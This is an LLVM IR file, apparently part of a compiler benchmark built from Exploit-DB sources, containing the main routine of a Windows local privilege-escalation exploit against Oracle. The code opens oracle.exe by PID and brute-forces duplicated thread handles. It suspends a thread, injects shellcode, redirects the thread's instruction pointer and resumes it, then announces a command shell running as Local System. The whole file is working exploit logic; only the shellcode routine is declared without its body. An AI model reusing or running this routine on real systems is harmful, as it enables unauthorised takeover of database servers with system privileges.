; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_3451.c__tmain.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_3451.c__tmain.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32 }

@FALSE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [52 x i8] c"Usage %s Oracle.exe PID SID , example: %s 453 orcl\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"\0AOpening oracle.exe PID: %d\0A\00", align 1
@PROCESS_DUP_HANDLE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"\0ACouldn't open oracle.exe process\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"\0ACheck Oracle PID\0A\00", align 1
@DUPLICATE_SAME_ACCESS = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [27 x i8] c"Found thread handle: 0x%x\0A\00", align 1
@CONTEXT_CONTROL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [28 x i8] c"Changing thread context...\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"Running exploit...\0A\00", align 1
@TRUE = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [61 x i8] c"\0AYou should have a command shell running as Local System :)\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"\0ACheck Oracle SID\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @_tmain(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.TYPE_4__, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %14 = load i64, i64* @FALSE, align 8
  store i64 %14, i64* %9, align 8
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 2
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  br i1 %23, label %32, label %24

24:                                               ; preds = %19, %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0), i8* %27, i8* %30)
  store i32 0, i32* %3, align 4
  br label %112

32:                                               ; preds = %19
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %12, align 8
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38)
  store i32 %39, i32* %10, align 4
  %40 = load i32, i32* %10, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 %40)
  %42 = load i32, i32* @PROCESS_DUP_HANDLE, align 4
  %43 = load i64, i64* @FALSE, align 8
  %44 = load i32, i32* %10, align 4
  %45 = call i32 @OpenProcess(i32 %42, i64 %43, i32 %44)
  store i32 %45, i32* %8, align 4
  %46 = load i32, i32* %8, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %51, label %48

48:                                               ; preds = %32
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %112

51:                                               ; preds = %32
  store i32 512, i32* %11, align 4
  br label %52

52:                                               ; preds = %99, %51
  %53 = load i32, i32* %11, align 4
  %54 = icmp sle i32 %53, 4096
  br i1 %54, label %55, label %102

55:                                               ; preds = %52
  %56 = load i32, i32* %11, align 4
  store i32 %56, i32* %6, align 4
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %6, align 4
  %59 = call i32 (...) @GetCurrentProcess()
  %60 = load i64, i64* @FALSE, align 8
  %61 = load i32, i32* @DUPLICATE_SAME_ACCESS, align 4
  %62 = call i64 @DuplicateHandle(i32 %57, i32 %58, i32 %59, i32* %7, i32 0, i64 %60, i32 %61)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %98

64:                                               ; preds = %55
  %65 = load i32, i32* %7, align 4
  %66 = call i64 @SuspendThread(i32 %65)
  %67 = icmp eq i64 %66, 0
  br i1 %67, label %68, label %95

68:                                               ; preds = %64
  %69 = load i32, i32* %6, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i32 %69)
  %71 = load i32, i32* @CONTEXT_CONTROL, align 4
  %72 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %13, i32 0, i32 1
  store i32 %71, i32* %72, align 4
  %73 = load i32, i32* %7, align 4
  %74 = call i32 @GetThreadContext(i32 %73, %struct.TYPE_4__* %13)
  %75 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %13, i32 0, i32 0
  %76 = load i32, i32* %75, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = call i64 @InjectShellcode(i32 %76, i8* %77)
  %79 = icmp ne i64 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %68
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  %82 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %13, i32 0, i32 0
  store i32 76154112, i32* %82, align 4
  %83 = load i32, i32* %7, align 4
  %84 = call i32 @SetThreadContext(i32 %83, %struct.TYPE_4__* %13)
  %85 = load i32, i32* %7, align 4
  %86 = call i32 @ResumeThread(i32 %85)
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %88 = load i64, i64* @TRUE, align 8
  store i64 %88, i64* %9, align 8
  %89 = call i32 @Sleep(i32 2000)
  br label %92

90:                                               ; preds = %68
  %91 = load i64, i64* @FALSE, align 8
  store i64 %91, i64* %9, align 8
  br label %92

92:                                               ; preds = %90, %80
  %93 = load i32, i32* %7, align 4
  %94 = call i32 @CloseHandle(i32 %93)
  br label %102

95:                                               ; preds = %64
  %96 = load i32, i32* %7, align 4
  %97 = call i32 @CloseHandle(i32 %96)
  br label %98

98:                                               ; preds = %95, %55
  br label %99

99:                                               ; preds = %98
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 4
  store i32 %101, i32* %11, align 4
  br label %52

102:                                              ; preds = %92, %52
  %103 = load i64, i64* %9, align 8
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %107

105:                                              ; preds = %102
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i64 0, i64 0))
  br label %109

107:                                              ; preds = %102
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  br label %109

109:                                              ; preds = %107, %105
  %110 = load i32, i32* %8, align 4
  %111 = call i32 @CloseHandle(i32 %110)
  store i32 0, i32* %3, align 4
  br label %112

112:                                              ; preds = %109, %48, %24
  %113 = load i32, i32* %3, align 4
  ret i32 %113
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @OpenProcess(i32, i64, i32) #1

declare dso_local i64 @DuplicateHandle(i32, i32, i32, i32*, i32, i64, i32) #1

declare dso_local i32 @GetCurrentProcess(...) #1

declare dso_local i64 @SuspendThread(i32) #1

declare dso_local i32 @GetThreadContext(i32, %struct.TYPE_4__*) #1

declare dso_local i64 @InjectShellcode(i32, i8*) #1

declare dso_local i32 @SetThreadContext(i32, %struct.TYPE_4__*) #1

declare dso_local i32 @ResumeThread(i32) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @CloseHandle(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
